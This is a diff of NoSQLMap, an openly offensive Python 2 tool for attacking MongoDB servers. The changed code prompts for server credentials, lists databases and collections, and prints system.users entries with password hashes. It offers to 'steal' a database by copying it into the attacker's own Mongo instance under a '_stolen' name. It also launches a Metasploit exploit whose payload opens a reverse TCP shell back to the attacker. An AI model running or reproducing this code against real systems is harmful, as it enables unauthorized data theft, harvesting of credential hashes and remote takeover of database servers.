@@ -13,6 +13,7 @@
 #You should have received a copy of the GNU General Public License
 #along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
+
 import sys
 import string
 import random
@@ -32,7 +33,7 @@ def mainMenu():
 	select = True
 	while select:
 		os.system('clear')
-		print "NoSQLMap v0.1-by Russell Butturini(tcstool@gmail.com)"
+		print "NoSQLMap v0.15DEV-nosqlmap@gmail.com"
 		print "\n"
 		print "1-Set options (do this first)"
 		print "2-NoSQL DB Access Attacks"
@@ -163,7 +164,7 @@ def options():
 			options()
 			
 		elif select == "7":
-			loadPath = raw_input("enter file name to load: ")
+			loadPath = raw_input("Enter file name to load: ")
 			try:
 				fo = open(loadPath,"r" )
 				csvOpt = fo.read()
@@ -173,7 +174,7 @@ def options():
 				webPort = optList[1]
 				uri = optList[2]
 				httpMethod = optList[3]
-				myIp = optList[4]
+				myIP = optList[4]
 				myPort = optList[5]
 			
 				#Set option checking array based on what was loaded
@@ -204,30 +205,47 @@ def netAttacks(target):
 	#This is a global for future use with other modules; may change
 	global dbList
 	
-	#Check for default config
+	srvNeedCreds = raw_input("Does the database server need credentials? ")
+	
+	if srvNeedCreds == "n" or srvNeedCreds == "N":
+		
+		try:
+			conn = pymongo.MongoClient(target,27017)
+			print "MongoDB port open on " + target + ":27017!"
+			mgtOpen = True
+	
+		except:
+			print "MongoDB port closed."
+		
+		
+	
+	
+	elif srvNeedCreds == "y" or srvNeedCreds == "Y":
+		srvUser = raw_input("Enter server username: ")
+		srvPass = raw_input("Enter server password: ")
+		uri = "mongodb://" + srvUser + ":" + srvPass + "@" + victim +"/"
+
+		try:
+			conn = pymongo.MongoClient(uri)
+			print "MongoDB authenticated on " + target + ":27017!"
+			mgtOpen = True
+		except:
+			raw_input("Failed to authenticate.  Press enter to continue...")
+			mainMenu()
+	
+	
+	mgtUrl = "http://" + target + ":28017"	
+	#Future rev:  Add web management interface parsing
+	
 	try:
-		conn = pymongo.MongoClient(target,27017)
-		print "MongoDB port open on " + target + ":27017!"
-		mgtOpen = True
-	
-	except:
-		print "MongoDB port closed."
-		
-		
-	mgtUrl = "http://" + target + ":28017"
-	
-	
-	try:		
-		#Future rev:  Add web management interface parsing
 		mgtRespCode = urllib.urlopen(mgtUrl).getcode()
 		if mgtRespCode == 200:
-			print "MongoDB web management open at " + mgtUrl + ".  Check this out!"
-	
-		else:
-			print "Got HTTP " + mgtRespCode + "from " + mgtUrl + "."
+			print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
+			
 	except:
-		print "MongoDB web management closed."
-	
+		
+		print "MongoDB web management closed or requires authentication."
+		
 	if mgtOpen == True:
 		#Ths is compiling server info?????
 		print "Server Info:"
@@ -235,11 +253,35 @@ def netAttacks(target):
 		print serverInfo
 
 		print "\n"
-
-		print "List of databases:"
-		dbList = conn.database_names()
-		print "\n".join(dbList)
-
+		
+		try:
+			print "List of databases:"
+			dbList = conn.database_names()
+			print "\n".join(dbList)
+			print "\n"
+			
+		except:
+			print "Error:  Couldn't list databases.  The provided credentials may not have rights."
+		
+		print "List of collections:"
+		#print "\n"
+		
+		try:
+			for dbItem in dbList:
+				db = conn[dbItem]
+				colls = db.collection_names()
+				print dbItem + ":"
+				print "\n".join(colls)
+				if 'system.users' in colls:
+					users = list(db.system.users.find())
+					print "Database Users and Password Hashes:"
+					#print dbItem
+					print str(users)
+			#print "\n"
+		
+		except:
+			print "Error:  Couldn't list collections.  The provided credentials may not have rights."
+			
 		stealDB = raw_input("Steal a database? (Requires your own Mongo instance): ")
 		
 		if stealDB == "y" or stealDB == "Y":
@@ -253,8 +295,7 @@ def netAttacks(target):
 				proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
 			
 			except:
-				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
-	
+				print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."	
 	raw_input("Press enter to continue...")
 	return()
 		
@@ -686,8 +727,21 @@ def stealDBs(myDB):
 		
 	try:
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
-		myDBConn = pymongo.MongoClient(myDB,27017)
-		myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
+		dbNeedCreds = raw_input("Does this database require credentials? ")
+		
+		if dbNeedCreds == "n" or dbNeedCreds == "N":	
+			myDBConn = pymongo.MongoClient(myDB,27017)
+			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
+		
+		elif dbNeedCreds == "y" or dbNeedCreds == "Y":
+			dbUser = raw_input("Enter database username: ")
+			dbPass = raw_input("Enter database password: ")
+			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
+		
+		else:
+			raw_input("Invalid Selection.  Press enter to continue.")
+			stealDBs(myDB)
+			
 		cloneAnother = raw_input("Database cloned.  Copy another?")
 		
 		if cloneAnother == "y" or cloneAnother == "Y":
